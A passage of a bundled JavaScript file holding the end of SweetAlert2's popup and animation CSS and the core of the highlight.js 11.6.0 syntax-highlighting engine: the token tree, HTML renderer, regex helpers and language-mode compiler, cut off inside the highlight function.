.5s}.swal2-icon.swal2-question.swal2-icon-show .swal2-icon-content{animation:swal2-animate-question-mark .8s}.swal2-icon.swal2-success{border-color:#a5dc86;color:#a5dc86}.swal2-icon.swal2-success [class^=swal2-success-circular-line]{position:absolute;width:3.75em;height:7.5em;transform:rotate(45deg);border-radius:50%}.swal2-icon.swal2-success [class^=swal2-success-circular-line][class$=left]{top:-0.4375em;left:-2.0635em;transform:rotate(-45deg);transform-origin:3.75em 3.75em;border-radius:7.5em 0 0 7.5em}.swal2-icon.swal2-success [class^=swal2-success-circular-line][class$=right]{top:-0.6875em;left:1.875em;transform:rotate(-45deg);transform-origin:0 3.75em;border-radius:0 7.5em 7.5em 0}.swal2-icon.swal2-success .swal2-success-ring{position:absolute;z-index:2;top:-0.25em;left:-0.25em;box-sizing:content-box;width:100%;height:100%;border:.25em solid rgba(165,220,134,.3);border-radius:50%}.swal2-icon.swal2-success .swal2-success-fix{position:absolute;z-index:1;top:.5em;left:1.625em;width:.4375em;height:5.625em;transform:rotate(-45deg)}.swal2-icon.swal2-success [class^=swal2-success-line]{display:block;position:absolute;z-index:2;height:.3125em;border-radius:.125em;background-color:#a5dc86}.swal2-icon.swal2-success [class^=swal2-success-line][class$=tip]{top:2.875em;left:.8125em;width:1.5625em;transform:rotate(45deg)}.swal2-icon.swal2-success [class^=swal2-success-line][class$=long]{top:2.375em;right:.5em;width:2.9375em;transform:rotate(-45deg)}.swal2-icon.swal2-success.swal2-icon-show .swal2-success-line-tip{animation:swal2-animate-success-line-tip .75s}.swal2-icon.swal2-success.swal2-icon-show .swal2-success-line-long{animation:swal2-animate-success-line-long .75s}.swal2-icon.swal2-success.swal2-icon-show .swal2-success-circular-line-right{animation:swal2-rotate-success-circular-line 4.25s ease-in}.swal2-progress-steps{flex-wrap:wrap;align-items:center;max-width:100%;margin:1.25em auto;padding:0;background:rgba(0,0,0,0);font-weight:600}.swal2-progress-steps li{display:inline-block;position:relative}.swal2-progress-steps .swal2-progress-step{z-index:20;flex-shrink:0;width:2em;height:2em;border-radius:2em;background:#2778c4;color:#fff;line-height:2em;text-align:center}.swal2-progress-steps .swal2-progress-step.swal2-active-progress-step{background:#2778c4}.swal2-progress-steps .swal2-progress-step.swal2-active-progress-step~.swal2-progress-step{background:#add8e6;color:#fff}.swal2-progress-steps .swal2-progress-step.swal2-active-progress-step~.swal2-progress-step-line{background:#add8e6}.swal2-progress-steps .swal2-progress-step-line{z-index:10;flex-shrink:0;width:2.5em;height:.4em;margin:0 -1px;background:#2778c4}[class^=swal2]{-webkit-tap-highlight-color:rgba(0,0,0,0)}.swal2-show{animation:swal2-show .3s}.swal2-hide{animation:swal2-hide .15s forwards}.swal2-noanimation{transition:none}.swal2-scrollbar-measure{position:absolute;top:-9999px;width:50px;height:50px;overflow:scroll}.swal2-rtl .swal2-close{margin-right:initial;margin-left:0}.swal2-rtl .swal2-timer-progress-bar{right:0;left:auto}@keyframes swal2-toast-show{0%{transform:translateY(-0.625em) rotateZ(2deg)}33%{transform:translateY(0) rotateZ(-2deg)}66%{transform:translateY(0.3125em) rotateZ(2deg)}100%{transform:translateY(0) rotateZ(0deg)}}@keyframes swal2-toast-hide{100%{transform:rotateZ(1deg);opacity:0}}@keyframes swal2-toast-animate-success-line-tip{0%{top:.5625em;left:.0625em;width:0}54%{top:.125em;left:.125em;width:0}70%{top:.625em;left:-0.25em;width:1.625em}84%{top:1.0625em;left:.75em;width:.5em}100%{top:1.125em;left:.1875em;width:.75em}}@keyframes swal2-toast-animate-success-line-long{0%{top:1.625em;right:1.375em;width:0}65%{top:1.25em;right:.9375em;width:0}84%{top:.9375em;right:0;width:1.125em}100%{top:.9375em;right:.1875em;width:1.375em}}@keyframes swal2-show{0%{transform:scale(0.7)}45%{transform:scale(1.05)}80%{transform:scale(0.95)}100%{transform:scale(1)}}@keyframes swal2-hide{0%{transform:scale(1);opacity:1}100%{transform:scale(0.5);opacity:0}}@keyframes swal2-animate-success-line-tip{0%{top:1.1875em;left:.0625em;width:0}54%{top:1.0625em;left:.125em;width:0}70%{top:2.1875em;left:-0.375em;width:3.125em}84%{top:3em;left:1.3125em;width:1.0625em}100%{top:2.8125em;left:.8125em;width:1.5625em}}@keyframes swal2-animate-success-line-long{0%{top:3.375em;right:2.875em;width:0}65%{top:3.375em;right:2.875em;width:0}84%{top:2.1875em;right:0;width:3.4375em}100%{top:2.375em;right:.5em;width:2.9375em}}@keyframes swal2-rotate-success-circular-line{0%{transform:rotate(-45deg)}5%{transform:rotate(-45deg)}12%{transform:rotate(-405deg)}100%{transform:rotate(-405deg)}}@keyframes swal2-animate-error-x-mark{0%{margin-top:1.625em;transform:scale(0.4);opacity:0}50%{margin-top:1.625em;transform:scale(0.4);opacity:0}80%{margin-top:-0.375em;transform:scale(1.15)}100%{margin-top:0;transform:scale(1);opacity:1}}@keyframes swal2-animate-error-icon{0%{transform:rotateX(100deg);opacity:0}100%{transform:rotateX(0deg);opacity:1}}@keyframes swal2-rotate-loading{0%{transform:rotate(0deg)}100%{transform:rotate(360deg)}}@keyframes swal2-animate-question-mark{0%{transform:rotateY(-360deg)}100%{transform:rotateY(0)}}@keyframes swal2-animate-i-mark{0%{transform:rotateZ(45deg);opacity:0}25%{transform:rotateZ(-25deg);opacity:.4}50%{transform:rotateZ(15deg);opacity:.8}75%{transform:rotateZ(-5deg);opacity:1}100%{transform:rotateX(0);opacity:1}}body.swal2-shown:not(.swal2-no-backdrop):not(.swal2-toast-shown){overflow:hidden}body.swal2-height-auto{height:auto !important}body.swal2-no-backdrop .swal2-container{background-color:rgba(0,0,0,0) !important;pointer-events:none}body.swal2-no-backdrop .swal2-container .swal2-popup{pointer-events:all}body.swal2-no-backdrop .swal2-container .swal2-modal{box-shadow:0 0 10px rgba(0,0,0,.4)}@media print{body.swal2-shown:not(.swal2-no-backdrop):not(.swal2-toast-shown){overflow-y:scroll !important}body.swal2-shown:not(.swal2-no-backdrop):not(.swal2-toast-shown)>[aria-hidden=true]{display:none}body.swal2-shown:not(.swal2-no-backdrop):not(.swal2-toast-shown) .swal2-container{position:static !important}}body.swal2-toast-shown .swal2-container{box-sizing:border-box;width:360px;max-width:100%;background-color:rgba(0,0,0,0);pointer-events:none}body.swal2-toast-shown .swal2-container.swal2-top{top:0;right:auto;bottom:auto;left:50%;transform:translateX(-50%)}body.swal2-toast-shown .swal2-container.swal2-top-end,body.swal2-toast-shown .swal2-container.swal2-top-right{top:0;right:0;bottom:auto;left:auto}body.swal2-toast-shown .swal2-container.swal2-top-start,body.swal2-toast-shown .swal2-container.swal2-top-left{top:0;right:auto;bottom:auto;left:0}body.swal2-toast-shown .swal2-container.swal2-center-start,body.swal2-toast-shown .swal2-container.swal2-center-left{top:50%;right:auto;bottom:auto;left:0;transform:translateY(-50%)}body.swal2-toast-shown .swal2-container.swal2-center{top:50%;right:auto;bottom:auto;left:50%;transform:translate(-50%, -50%)}body.swal2-toast-shown .swal2-container.swal2-center-end,body.swal2-toast-shown .swal2-container.swal2-center-right{top:50%;right:0;bottom:auto;left:auto;transform:translateY(-50%)}body.swal2-toast-shown .swal2-container.swal2-bottom-start,body.swal2-toast-shown .swal2-container.swal2-bottom-left{top:auto;right:auto;bottom:0;left:0}body.swal2-toast-shown .swal2-container.swal2-bottom{top:auto;right:auto;bottom:0;left:50%;transform:translateX(-50%)}body.swal2-toast-shown .swal2-container.swal2-bottom-end,body.swal2-toast-shown .swal2-container.swal2-bottom-right{top:auto;right:0;bottom:0;left:auto}');
})(sweetalert2_all);
const Swal$1 = sweetalert2_all.exports;
var deepFreezeEs6 = { exports: {} };
function deepFreeze(obj) {
  if (obj instanceof Map) {
    obj.clear = obj.delete = obj.set = function() {
      throw new Error("map is read-only");
    };
  } else if (obj instanceof Set) {
    obj.add = obj.clear = obj.delete = function() {
      throw new Error("set is read-only");
    };
  }
  Object.freeze(obj);
  Object.getOwnPropertyNames(obj).forEach(function(name) {
    var prop = obj[name];
    if (typeof prop == "object" && !Object.isFrozen(prop)) {
      deepFreeze(prop);
    }
  });
  return obj;
}
deepFreezeEs6.exports = deepFreeze;
deepFreezeEs6.exports.default = deepFreeze;
class Response {
  constructor(mode) {
    if (mode.data === void 0)
      mode.data = {};
    this.data = mode.data;
    this.isMatchIgnored = false;
  }
  ignoreMatch() {
    this.isMatchIgnored = true;
  }
}
function escapeHTML(value) {
  return value.replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;").replace(/"/g, "&quot;").replace(/'/g, "&#x27;");
}
function inherit$1(original, ...objects) {
  const result = /* @__PURE__ */ Object.create(null);
  for (const key in original) {
    result[key] = original[key];
  }
  objects.forEach(function(obj) {
    for (const key in obj) {
      result[key] = obj[key];
    }
  });
  return result;
}
const SPAN_CLOSE = "</span>";
const emitsWrappingTags = (node) => {
  return !!node.scope || node.sublanguage && node.language;
};
const scopeToCSSClass = (name, { prefix }) => {
  if (name.includes(".")) {
    const pieces = name.split(".");
    return [
      `${prefix}${pieces.shift()}`,
      ...pieces.map((x, i) => `${x}${"_".repeat(i + 1)}`)
    ].join(" ");
  }
  return `${prefix}${name}`;
};
class HTMLRenderer {
  constructor(parseTree, options) {
    this.buffer = "";
    this.classPrefix = options.classPrefix;
    parseTree.walk(this);
  }
  addText(text) {
    this.buffer += escapeHTML(text);
  }
  openNode(node) {
    if (!emitsWrappingTags(node))
      return;
    let className = "";
    if (node.sublanguage) {
      className = `language-${node.language}`;
    } else {
      className = scopeToCSSClass(node.scope, { prefix: this.classPrefix });
    }
    this.span(className);
  }
  closeNode(node) {
    if (!emitsWrappingTags(node))
      return;
    this.buffer += SPAN_CLOSE;
  }
  value() {
    return this.buffer;
  }
  span(className) {
    this.buffer += `<span class="${className}">`;
  }
}
const newNode = (opts = {}) => {
  const result = { children: [] };
  Object.assign(result, opts);
  return result;
};
class TokenTree {
  constructor() {
    this.rootNode = newNode();
    this.stack = [this.rootNode];
  }
  get top() {
    return this.stack[this.stack.length - 1];
  }
  get root() {
    return this.rootNode;
  }
  add(node) {
    this.top.children.push(node);
  }
  openNode(scope) {
    const node = newNode({ scope });
    this.add(node);
    this.stack.push(node);
  }
  closeNode() {
    if (this.stack.length > 1) {
      return this.stack.pop();
    }
    return void 0;
  }
  closeAllNodes() {
    while (this.closeNode())
      ;
  }
  toJSON() {
    return JSON.stringify(this.rootNode, null, 4);
  }
  walk(builder) {
    return this.constructor._walk(builder, this.rootNode);
  }
  static _walk(builder, node) {
    if (typeof node === "string") {
      builder.addText(node);
    } else if (node.children) {
      builder.openNode(node);
      node.children.forEach((child) => this._walk(builder, child));
      builder.closeNode(node);
    }
    return builder;
  }
  static _collapse(node) {
    if (typeof node === "string")
      return;
    if (!node.children)
      return;
    if (node.children.every((el) => typeof el === "string")) {
      node.children = [node.children.join("")];
    } else {
      node.children.forEach((child) => {
        TokenTree._collapse(child);
      });
    }
  }
}
class TokenTreeEmitter extends TokenTree {
  constructor(options) {
    super();
    this.options = options;
  }
  addKeyword(text, scope) {
    if (text === "") {
      return;
    }
    this.openNode(scope);
    this.addText(text);
    this.closeNode();
  }
  addText(text) {
    if (text === "") {
      return;
    }
    this.add(text);
  }
  addSublanguage(emitter, name) {
    const node = emitter.root;
    node.sublanguage = true;
    node.language = name;
    this.add(node);
  }
  toHTML() {
    const renderer = new HTMLRenderer(this, this.options);
    return renderer.value();
  }
  finalize() {
    return true;
  }
}
function source(re) {
  if (!re)
    return null;
  if (typeof re === "string")
    return re;
  return re.source;
}
function lookahead(re) {
  return concat("(?=", re, ")");
}
function anyNumberOfTimes(re) {
  return concat("(?:", re, ")*");
}
function optional(re) {
  return concat("(?:", re, ")?");
}
function concat(...args) {
  const joined = args.map((x) => source(x)).join("");
  return joined;
}
function stripOptionsFromArgs(args) {
  const opts = args[args.length - 1];
  if (typeof opts === "object" && opts.constructor === Object) {
    args.splice(args.length - 1, 1);
    return opts;
  } else {
    return {};
  }
}
function either(...args) {
  const opts = stripOptionsFromArgs(args);
  const joined = "(" + (opts.capture ? "" : "?:") + args.map((x) => source(x)).join("|") + ")";
  return joined;
}
function countMatchGroups(re) {
  return new RegExp(re.toString() + "|").exec("").length - 1;
}
function startsWith(re, lexeme) {
  const match = re && re.exec(lexeme);
  return match && match.index === 0;
}
const BACKREF_RE = /\[(?:[^\\\]]|\\.)*\]|\(\??|\\([1-9][0-9]*)|\\./;
function _rewriteBackreferences(regexps, { joinWith }) {
  let numCaptures = 0;
  return regexps.map((regex) => {
    numCaptures += 1;
    const offset = numCaptures;
    let re = source(regex);
    let out = "";
    while (re.length > 0) {
      const match = BACKREF_RE.exec(re);
      if (!match) {
        out += re;
        break;
      }
      out += re.substring(0, match.index);
      re = re.substring(match.index + match[0].length);
      if (match[0][0] === "\\" && match[1]) {
        out += "\\" + String(Number(match[1]) + offset);
      } else {
        out += match[0];
        if (match[0] === "(") {
          numCaptures++;
        }
      }
    }
    return out;
  }).map((re) => `(${re})`).join(joinWith);
}
const MATCH_NOTHING_RE = /\b\B/;
const IDENT_RE$1 = "[a-zA-Z]\\w*";
const UNDERSCORE_IDENT_RE = "[a-zA-Z_]\\w*";
const NUMBER_RE = "\\b\\d+(\\.\\d+)?";
const C_NUMBER_RE = "(-?)(\\b0[xX][a-fA-F0-9]+|(\\b\\d+(\\.\\d*)?|\\.\\d+)([eE][-+]?\\d+)?)";
const BINARY_NUMBER_RE = "\\b(0b[01]+)";
const RE_STARTERS_RE = "!|!=|!==|%|%=|&|&&|&=|\\*|\\*=|\\+|\\+=|,|-|-=|/=|/|:|;|<<|<<=|<=|<|===|==|=|>>>=|>>=|>=|>>>|>>|>|\\?|\\[|\\{|\\(|\\^|\\^=|\\||\\|=|\\|\\||~";
const SHEBANG = (opts = {}) => {
  const beginShebang = /^#![ ]*\//;
  if (opts.binary) {
    opts.begin = concat(
      beginShebang,
      /.*\b/,
      opts.binary,
      /\b.*/
    );
  }
  return inherit$1({
    scope: "meta",
    begin: beginShebang,
    end: /$/,
    relevance: 0,
    "on:begin": (m, resp) => {
      if (m.index !== 0)
        resp.ignoreMatch();
    }
  }, opts);
};
const BACKSLASH_ESCAPE = {
  begin: "\\\\[\\s\\S]",
  relevance: 0
};
const APOS_STRING_MODE = {
  scope: "string",
  begin: "'",
  end: "'",
  illegal: "\\n",
  contains: [BACKSLASH_ESCAPE]
};
const QUOTE_STRING_MODE = {
  scope: "string",
  begin: '"',
  end: '"',
  illegal: "\\n",
  contains: [BACKSLASH_ESCAPE]
};
const PHRASAL_WORDS_MODE = {
  begin: /\b(a|an|the|are|I'm|isn't|don't|doesn't|won't|but|just|should|pretty|simply|enough|gonna|going|wtf|so|such|will|you|your|they|like|more)\b/
};
const COMMENT = function(begin, end, modeOptions = {}) {
  const mode = inherit$1(
    {
      scope: "comment",
      begin,
      end,
      contains: []
    },
    modeOptions
  );
  mode.contains.push({
    scope: "doctag",
    begin: "[ ]*(?=(TODO|FIXME|NOTE|BUG|OPTIMIZE|HACK|XXX):)",
    end: /(TODO|FIXME|NOTE|BUG|OPTIMIZE|HACK|XXX):/,
    excludeBegin: true,
    relevance: 0
  });
  const ENGLISH_WORD = either(
    "I",
    "a",
    "is",
    "so",
    "us",
    "to",
    "at",
    "if",
    "in",
    "it",
    "on",
    /[A-Za-z]+['](d|ve|re|ll|t|s|n)/,
    /[A-Za-z]+[-][a-z]+/,
    /[A-Za-z][a-z]{2,}/
  );
  mode.contains.push(
    {
      begin: concat(
        /[ ]+/,
        "(",
        ENGLISH_WORD,
        /[.]?[:]?([.][ ]|[ ])/,
        "){3}"
      )
    }
  );
  return mode;
};
const C_LINE_COMMENT_MODE = COMMENT("//", "$");
const C_BLOCK_COMMENT_MODE = COMMENT("/\\*", "\\*/");
const HASH_COMMENT_MODE = COMMENT("#", "$");
const NUMBER_MODE = {
  scope: "number",
  begin: NUMBER_RE,
  relevance: 0
};
const C_NUMBER_MODE = {
  scope: "number",
  begin: C_NUMBER_RE,
  relevance: 0
};
const BINARY_NUMBER_MODE = {
  scope: "number",
  begin: BINARY_NUMBER_RE,
  relevance: 0
};
const REGEXP_MODE = {
  begin: /(?=\/[^/\n]*\/)/,
  contains: [{
    scope: "regexp",
    begin: /\//,
    end: /\/[gimuy]*/,
    illegal: /\n/,
    contains: [
      BACKSLASH_ESCAPE,
      {
        begin: /\[/,
        end: /\]/,
        relevance: 0,
        contains: [BACKSLASH_ESCAPE]
      }
    ]
  }]
};
const TITLE_MODE = {
  scope: "title",
  begin: IDENT_RE$1,
  relevance: 0
};
const UNDERSCORE_TITLE_MODE = {
  scope: "title",
  begin: UNDERSCORE_IDENT_RE,
  relevance: 0
};
const METHOD_GUARD = {
  begin: "\\.\\s*" + UNDERSCORE_IDENT_RE,
  relevance: 0
};
const END_SAME_AS_BEGIN = function(mode) {
  return Object.assign(
    mode,
    {
      "on:begin": (m, resp) => {
        resp.data._beginMatch = m[1];
      },
      "on:end": (m, resp) => {
        if (resp.data._beginMatch !== m[1])
          resp.ignoreMatch();
      }
    }
  );
};
var MODES = /* @__PURE__ */ Object.freeze({
  __proto__: null,
  MATCH_NOTHING_RE,
  IDENT_RE: IDENT_RE$1,
  UNDERSCORE_IDENT_RE,
  NUMBER_RE,
  C_NUMBER_RE,
  BINARY_NUMBER_RE,
  RE_STARTERS_RE,
  SHEBANG,
  BACKSLASH_ESCAPE,
  APOS_STRING_MODE,
  QUOTE_STRING_MODE,
  PHRASAL_WORDS_MODE,
  COMMENT,
  C_LINE_COMMENT_MODE,
  C_BLOCK_COMMENT_MODE,
  HASH_COMMENT_MODE,
  NUMBER_MODE,
  C_NUMBER_MODE,
  BINARY_NUMBER_MODE,
  REGEXP_MODE,
  TITLE_MODE,
  UNDERSCORE_TITLE_MODE,
  METHOD_GUARD,
  END_SAME_AS_BEGIN
});
function skipIfHasPrecedingDot(match, response) {
  const before = match.input[match.index - 1];
  if (before === ".") {
    response.ignoreMatch();
  }
}
function scopeClassName(mode, _parent) {
  if (mode.className !== void 0) {
    mode.scope = mode.className;
    delete mode.className;
  }
}
function beginKeywords(mode, parent) {
  if (!parent)
    return;
  if (!mode.beginKeywords)
    return;
  mode.begin = "\\b(" + mode.beginKeywords.split(" ").join("|") + ")(?!\\.)(?=\\b|\\s)";
  mode.__beforeBegin = skipIfHasPrecedingDot;
  mode.keywords = mode.keywords || mode.beginKeywords;
  delete mode.beginKeywords;
  if (mode.relevance === void 0)
    mode.relevance = 0;
}
function compileIllegal(mode, _parent) {
  if (!Array.isArray(mode.illegal))
    return;
  mode.illegal = either(...mode.illegal);
}
function compileMatch(mode, _parent) {
  if (!mode.match)
    return;
  if (mode.begin || mode.end)
    throw new Error("begin & end are not supported with match");
  mode.begin = mode.match;
  delete mode.match;
}
function compileRelevance(mode, _parent) {
  if (mode.relevance === void 0)
    mode.relevance = 1;
}
const beforeMatchExt = (mode, parent) => {
  if (!mode.beforeMatch)
    return;
  if (mode.starts)
    throw new Error("beforeMatch cannot be used with starts");
  const originalMode = Object.assign({}, mode);
  Object.keys(mode).forEach((key) => {
    delete mode[key];
  });
  mode.keywords = originalMode.keywords;
  mode.begin = concat(originalMode.beforeMatch, lookahead(originalMode.begin));
  mode.starts = {
    relevance: 0,
    contains: [
      Object.assign(originalMode, { endsParent: true })
    ]
  };
  mode.relevance = 0;
  delete originalMode.beforeMatch;
};
const COMMON_KEYWORDS = [
  "of",
  "and",
  "for",
  "in",
  "not",
  "or",
  "if",
  "then",
  "parent",
  "list",
  "value"
];
const DEFAULT_KEYWORD_SCOPE = "keyword";
function compileKeywords(rawKeywords, caseInsensitive, scopeName = DEFAULT_KEYWORD_SCOPE) {
  const compiledKeywords = /* @__PURE__ */ Object.create(null);
  if (typeof rawKeywords === "string") {
    compileList(scopeName, rawKeywords.split(" "));
  } else if (Array.isArray(rawKeywords)) {
    compileList(scopeName, rawKeywords);
  } else {
    Object.keys(rawKeywords).forEach(function(scopeName2) {
      Object.assign(
        compiledKeywords,
        compileKeywords(rawKeywords[scopeName2], caseInsensitive, scopeName2)
      );
    });
  }
  return compiledKeywords;
  function compileList(scopeName2, keywordList) {
    if (caseInsensitive) {
      keywordList = keywordList.map((x) => x.toLowerCase());
    }
    keywordList.forEach(function(keyword) {
      const pair = keyword.split("|");
      compiledKeywords[pair[0]] = [scopeName2, scoreForKeyword(pair[0], pair[1])];
    });
  }
}
function scoreForKeyword(keyword, providedScore) {
  if (providedScore) {
    return Number(providedScore);
  }
  return commonKeyword(keyword) ? 0 : 1;
}
function commonKeyword(keyword) {
  return COMMON_KEYWORDS.includes(keyword.toLowerCase());
}
const seenDeprecations = {};
const error = (message) => {
  console.error(message);
};
const warn = (message, ...args) => {
  console.log(`WARN: ${message}`, ...args);
};
const deprecated = (version2, message) => {
  if (seenDeprecations[`${version2}/${message}`])
    return;
  console.log(`Deprecated as of ${version2}. ${message}`);
  seenDeprecations[`${version2}/${message}`] = true;
};
const MultiClassError = new Error();
function remapScopeNames(mode, regexes, { key }) {
  let offset = 0;
  const scopeNames = mode[key];
  const emit = {};
  const positions = {};
  for (let i = 1; i <= regexes.length; i++) {
    positions[i + offset] = scopeNames[i];
    emit[i + offset] = true;
    offset += countMatchGroups(regexes[i - 1]);
  }
  mode[key] = positions;
  mode[key]._emit = emit;
  mode[key]._multi = true;
}
function beginMultiClass(mode) {
  if (!Array.isArray(mode.begin))
    return;
  if (mode.skip || mode.excludeBegin || mode.returnBegin) {
    error("skip, excludeBegin, returnBegin not compatible with beginScope: {}");
    throw MultiClassError;
  }
  if (typeof mode.beginScope !== "object" || mode.beginScope === null) {
    error("beginScope must be object");
    throw MultiClassError;
  }
  remapScopeNames(mode, mode.begin, { key: "beginScope" });
  mode.begin = _rewriteBackreferences(mode.begin, { joinWith: "" });
}
function endMultiClass(mode) {
  if (!Array.isArray(mode.end))
    return;
  if (mode.skip || mode.excludeEnd || mode.returnEnd) {
    error("skip, excludeEnd, returnEnd not compatible with endScope: {}");
    throw MultiClassError;
  }
  if (typeof mode.endScope !== "object" || mode.endScope === null) {
    error("endScope must be object");
    throw MultiClassError;
  }
  remapScopeNames(mode, mode.end, { key: "endScope" });
  mode.end = _rewriteBackreferences(mode.end, { joinWith: "" });
}
function scopeSugar(mode) {
  if (mode.scope && typeof mode.scope === "object" && mode.scope !== null) {
    mode.beginScope = mode.scope;
    delete mode.scope;
  }
}
function MultiClass(mode) {
  scopeSugar(mode);
  if (typeof mode.beginScope === "string") {
    mode.beginScope = { _wrap: mode.beginScope };
  }
  if (typeof mode.endScope === "string") {
    mode.endScope = { _wrap: mode.endScope };
  }
  beginMultiClass(mode);
  endMultiClass(mode);
}
function compileLanguage(language) {
  function langRe(value, global2) {
    return new RegExp(
      source(value),
      "m" + (language.case_insensitive ? "i" : "") + (language.unicodeRegex ? "u" : "") + (global2 ? "g" : "")
    );
  }
  class MultiRegex {
    constructor() {
      this.matchIndexes = {};
      this.regexes = [];
      this.matchAt = 1;
      this.position = 0;
    }
    addRule(re, opts) {
      opts.position = this.position++;
      this.matchIndexes[this.matchAt] = opts;
      this.regexes.push([opts, re]);
      this.matchAt += countMatchGroups(re) + 1;
    }
    compile() {
      if (this.regexes.length === 0) {
        this.exec = () => null;
      }
      const terminators = this.regexes.map((el) => el[1]);
      this.matcherRe = langRe(_rewriteBackreferences(terminators, { joinWith: "|" }), true);
      this.lastIndex = 0;
    }
    exec(s) {
      this.matcherRe.lastIndex = this.lastIndex;
      const match = this.matcherRe.exec(s);
      if (!match) {
        return null;
      }
      const i = match.findIndex((el, i2) => i2 > 0 && el !== void 0);
      const matchData = this.matchIndexes[i];
      match.splice(0, i);
      return Object.assign(match, matchData);
    }
  }
  class ResumableMultiRegex {
    constructor() {
      this.rules = [];
      this.multiRegexes = [];
      this.count = 0;
      this.lastIndex = 0;
      this.regexIndex = 0;
    }
    getMatcher(index) {
      if (this.multiRegexes[index])
        return this.multiRegexes[index];
      const matcher = new MultiRegex();
      this.rules.slice(index).forEach(([re, opts]) => matcher.addRule(re, opts));
      matcher.compile();
      this.multiRegexes[index] = matcher;
      return matcher;
    }
    resumingScanAtSamePosition() {
      return this.regexIndex !== 0;
    }
    considerAll() {
      this.regexIndex = 0;
    }
    addRule(re, opts) {
      this.rules.push([re, opts]);
      if (opts.type === "begin")
        this.count++;
    }
    exec(s) {
      const m = this.getMatcher(this.regexIndex);
      m.lastIndex = this.lastIndex;
      let result = m.exec(s);
      if (this.resumingScanAtSamePosition()) {
        if (result && result.index === this.lastIndex)
          ;
        else {
          const m2 = this.getMatcher(0);
          m2.lastIndex = this.lastIndex + 1;
          result = m2.exec(s);
        }
      }
      if (result) {
        this.regexIndex += result.position + 1;
        if (this.regexIndex === this.count) {
          this.considerAll();
        }
      }
      return result;
    }
  }
  function buildModeRegex(mode) {
    const mm = new ResumableMultiRegex();
    mode.contains.forEach((term) => mm.addRule(term.begin, { rule: term, type: "begin" }));
    if (mode.terminatorEnd) {
      mm.addRule(mode.terminatorEnd, { type: "end" });
    }
    if (mode.illegal) {
      mm.addRule(mode.illegal, { type: "illegal" });
    }
    return mm;
  }
  function compileMode(mode, parent) {
    const cmode = mode;
    if (mode.isCompiled)
      return cmode;
    [
      scopeClassName,
      compileMatch,
      MultiClass,
      beforeMatchExt
    ].forEach((ext) => ext(mode, parent));
    language.compilerExtensions.forEach((ext) => ext(mode, parent));
    mode.__beforeBegin = null;
    [
      beginKeywords,
      compileIllegal,
      compileRelevance
    ].forEach((ext) => ext(mode, parent));
    mode.isCompiled = true;
    let keywordPattern = null;
    if (typeof mode.keywords === "object" && mode.keywords.$pattern) {
      mode.keywords = Object.assign({}, mode.keywords);
      keywordPattern = mode.keywords.$pattern;
      delete mode.keywords.$pattern;
    }
    keywordPattern = keywordPattern || /\w+/;
    if (mode.keywords) {
      mode.keywords = compileKeywords(mode.keywords, language.case_insensitive);
    }
    cmode.keywordPatternRe = langRe(keywordPattern, true);
    if (parent) {
      if (!mode.begin)
        mode.begin = /\B|\b/;
      cmode.beginRe = langRe(cmode.begin);
      if (!mode.end && !mode.endsWithParent)
        mode.end = /\B|\b/;
      if (mode.end)
        cmode.endRe = langRe(cmode.end);
      cmode.terminatorEnd = source(cmode.end) || "";
      if (mode.endsWithParent && parent.terminatorEnd) {
        cmode.terminatorEnd += (mode.end ? "|" : "") + parent.terminatorEnd;
      }
    }
    if (mode.illegal)
      cmode.illegalRe = langRe(mode.illegal);
    if (!mode.contains)
      mode.contains = [];
    mode.contains = [].concat(...mode.contains.map(function(c) {
      return expandOrCloneMode(c === "self" ? mode : c);
    }));
    mode.contains.forEach(function(c) {
      compileMode(c, cmode);
    });
    if (mode.starts) {
      compileMode(mode.starts, parent);
    }
    cmode.matcher = buildModeRegex(cmode);
    return cmode;
  }
  if (!language.compilerExtensions)
    language.compilerExtensions = [];
  if (language.contains && language.contains.includes("self")) {
    throw new Error("ERR: contains `self` is not supported at the top-level of a language.  See documentation.");
  }
  language.classNameAliases = inherit$1(language.classNameAliases || {});
  return compileMode(language);
}
function dependencyOnParent(mode) {
  if (!mode)
    return false;
  return mode.endsWithParent || dependencyOnParent(mode.starts);
}
function expandOrCloneMode(mode) {
  if (mode.variants && !mode.cachedVariants) {
    mode.cachedVariants = mode.variants.map(function(variant) {
      return inherit$1(mode, { variants: null }, variant);
    });
  }
  if (mode.cachedVariants) {
    return mode.cachedVariants;
  }
  if (dependencyOnParent(mode)) {
    return inherit$1(mode, { starts: mode.starts ? inherit$1(mode.starts) : null });
  }
  if (Object.isFrozen(mode)) {
    return inherit$1(mode);
  }
  return mode;
}
var version = "11.6.0";
class HTMLInjectionError extends Error {
  constructor(reason, html) {
    super(reason);
    this.name = "HTMLInjectionError";
    this.html = html;
  }
}
const escape = escapeHTML;
const inherit = inherit$1;
const NO_MATCH = Symbol("nomatch");
const MAX_KEYWORD_HITS = 7;
const HLJS = function(hljs) {
  const languages = /* @__PURE__ */ Object.create(null);
  const aliases = /* @__PURE__ */ Object.create(null);
  const plugins = [];
  let SAFE_MODE = true;
  const LANGUAGE_NOT_FOUND = "Could not find the language '{}', did you forget to load/include a language module?";
  const PLAINTEXT_LANGUAGE = { disableAutodetect: true, name: "Plain text", contains: [] };
  let options = {
    ignoreUnescapedHTML: false,
    throwUnescapedHTML: false,
    noHighlightRe: /^(no-?highlight)$/i,
    languageDetectRe: /\blang(?:uage)?-([\w-]+)\b/i,
    classPrefix: "hljs-",
    cssSelector: "pre code",
    languages: null,
    __emitter: TokenTreeEmitter
  };
  function shouldNotHighlight(languageName) {
    return options.noHighlightRe.test(languageName);
  }
  function blockLanguage(block) {
    let classes = block.className + " ";
    classes += block.parentNode ? block.parentNode.className : "";
    const match = options.languageDetectRe.exec(classes);
    if (match) {
      const language = getLanguage(match[1]);
      if (!language) {
        warn(LANGUAGE_NOT_FOUND.replace("{}", match[1]));
        warn("Falling back to no-highlight mode for this block.", block);
      }
      return language ? match[1] : "no-highlight";
    }
    return classes.split(/\s+/).find((_class) => shouldNotHighlight(_class) || getLanguage(_class));
  }
  function highlight2(codeOrLanguageName, optionsOrCode, ignoreIllegals) {
    let code = "";
    let languageName = "";
    if (typeof optionsOrCode === "object") {
      code = codeOrLanguageName;
      ignoreIllegals = optionsOrCode.ignoreIllegals;
      languageName = optionsOrCode.language;
    } else {
      deprecated("10.7.0", "highlight(lang, code, ...args) has been deprecated.");
      deprecated("10.7.0", "Please use highlight(code, options) instead.\nhttps://github.com/highlightjs/highlight.js/issues/2277");
      languageName = codeOrLanguageName;
      code = optionsOrCode;
    }
    if (ignoreIllegals === void 0) {
      ignoreIllegals = true;
    }
    const context = {
      code,
      language: languageName
    };
    fire("before:highlight", context);
    const result = context.result ? context.result : _highlight(context.language, context.code, ignoreIllegals);
